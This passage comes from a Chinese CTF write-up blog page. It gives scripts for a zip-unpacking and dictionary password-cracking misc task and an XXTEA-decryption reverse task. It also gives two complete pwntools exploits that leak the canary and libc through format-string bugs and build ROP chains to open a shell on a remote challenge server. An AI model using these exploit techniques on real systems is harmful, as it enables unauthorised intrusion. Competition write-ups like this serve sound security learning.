+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_path, output_dir</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">            zip_ref.extractall(temp_dir)</span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(temp_dir):</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                    file_path = os.path.join(root, file)</span><br><span class="line">                    <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                        extract_zip(file_path, output_dir)</span><br><span class="line">                    <span class="keyword">elif</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                        shutil.move(file_path, os.path.join(output_dir, file))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Extracted <span class="subst">&#123;file&#125;</span> to <span class="subst">&#123;output_dir&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            shutil.rmtree(temp_dir)</span><br><span class="line"></span><br><span class="line">zip_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/&#x27;</span></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line"></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(zip_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br></pre></td></tr></table></figure>
+<p>将300个字典合并成1个，然后跑字典爆破密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line">combined_file_path = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/combined.dic&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(combined_file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> combined_file:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(output_dir):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">            dic_file_path = os.path.join(output_dir, filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(dic_file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> dic_file:</span><br><span class="line">                content = dic_file.read()</span><br><span class="line">                combined_file.write(content)</span><br><span class="line">                combined_file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;All .dic files have been combined into <span class="subst">&#123;combined_file_path&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="C:/Users/67300/AppData/Roaming/Typora/typora-user-images/image-20241016113045440.png"
+                        alt="image-20241016113045440"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113315654.png"
+                        alt="image-20241016113315654"
+                 ></p>
+<p>看了一下f_几就嵌套几层，可以直接用everything一把梭，找到文件，每个文件是base64的一段</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113621322.png"
+                        alt="image-20241016113621322"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113824170.png"
+                        alt="image-20241016113824170"
+                 ></p>
+<h3 id="Pwn">Pwn</h3>
+<h4 id="book">book</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./book&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31248&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sa(<span class="string">b&quot;name:\n&quot;</span>, payload)</span><br><span class="line">    ru(<span class="string">b&quot;name is:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">b&quot;write\n&quot;</span>)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    fmt(<span class="string">&quot;%8$p-%19$p-%13$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x14a0</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = codebase + <span class="number">0x4068</span></span><br><span class="line">    pop_rdi_ret = codebase + <span class="number">0x0000000000001503</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    pay = fmtstr_payload(<span class="number">6</span>, &#123;b : <span class="number">0x200</span>&#125;)</span><br><span class="line">    fmt(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) </span><br><span class="line">    attack(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h4 id="magic-fmt">magic_fmt</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./magic_fmt&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;37023&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span></span><br><span class="line">    s(pay)</span><br><span class="line">    ru(<span class="string">b&quot;can &quot;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">    ret_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x8</span></span><br><span class="line">    success(<span class="string">f&quot;ret: <span class="subst">&#123;ret_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;else?\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr)</span><br><span class="line"></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line">    pay = <span class="string">f&quot;%45$p%<span class="subst">&#123;<span class="number">0x68</span>-<span class="number">14</span>&#125;</span>c%6$hhn&quot;</span>.encode()</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;magic:\n&quot;</span>)</span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">    pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rsp = ret_addr - <span class="number">0x118</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;possess\n&quot;</span>)</span><br><span class="line">    pay = p64(ret_addr) + fit(ret, pop_rdi_ret, binsh, system)</span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">b&quot;else?&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;have?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rbp_offset = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x8B</span>&#125;</span>c%6$hhn%<span class="subst">&#123;(rsp&amp;<span class="number">0xffff</span>) - <span class="number">0x8b</span>&#125;</span>c%<span class="subst">&#123;rbp_offset&#125;</span>$hn&quot;</span>.encode()</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;bbase 0x1327&quot;)</span></span><br><span class="line">    s(pay)</span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h3 id="Reverse">Reverse</h3>
+<h4 id="easy-choice">easy_choice</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w[<span class="number">8</span>] = &#123;<span class="number">0xAC3A28FD</span>, <span class="number">0x2331590C</span>, <span class="number">0x329F681B</span>, <span class="number">0xA6CF62DB</span>, <span class="number">0x8738A413</span>, <span class="number">0x44D27414</span>, <span class="number">0xDEF3A4CD</span>, <span class="number">0x5B22BA91</span>&#125;;<span class="comment">//可改</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">2</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x41</span>,<span class="number">0x53</span>,<span class="number">0x43</span>,<span class="number">0x54</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> sum;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key2[<span class="number">4</span>]=&#123;<span class="number">0x54</span>,<span class="number">0x4f</span>,<span class="number">0x44</span>,<span class="number">0x41</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> o=<span class="number">0</span>;o&lt;<span class="number">4</span>;o++)</span><br><span class="line">	&#123;	</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		v[<span class="number">0</span>]=w[<span class="number">2</span>*o];</span><br><span class="line">		v[<span class="number">1</span>]=w[<span class="number">2</span>*o+<span class="number">1</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum -= delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">		y = v[<span class="number">0</span>];</span><br><span class="line">		sum = rounds*delta;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p<span class="number">-1</span>];</span><br><span class="line">				v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key2[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">				y = v[p];</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n<span class="number">-1</span>];</span><br><span class="line">			v[<span class="number">0</span>] -= (((key2[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">			y = v[<span class="number">0</span>];</span><br><span class="line">			sum = sum-delta;</span><br><span class="line">		&#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line">		w[<span class="number">2</span>*o]=v[<span class="number">0</span>];</span><br><span class="line">		w[<span class="number">2</span>*o+<span class="number">1</span>]=v[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;w[i]+<span class="number">0</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">1</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">2</span>),*((<span class="type">char</span>*)&amp;w[i]+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Misc/">Misc</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/post/SystemReinstall/"
+                                   title="如何优雅的重装系统"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">如何优雅的重装系统</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/post/BeautifyBash/"
+                                   title="记录自用的终端美化方案"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">记录自用的终端美化方案</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
+          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
+          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
+          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
+          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
+          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
+        </script>
+
+        
+
+        
+            <script 
+                    async
+                    type="module"
+            >
+              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
+              window.KeepCommentPlugin.initWaline = () => {
+                if (init) {
+                  init(window.KeepCommentPlugin.walineOptions)
+                  window.KeepCommentPlugin.hideLoading()
+                } else {
+                  setTimeout(() => {
+                    window.KeepCommentPlugin.initWaline()
+                  }, 1000)
+                }
+              }
+
+              if ('false' === 'true') {
+                setTimeout(() => {
+                  window.KeepCommentPlugin.initWaline()
+                }, 1200)
+              } else {
+                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
+              }
+            </script>
+        
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
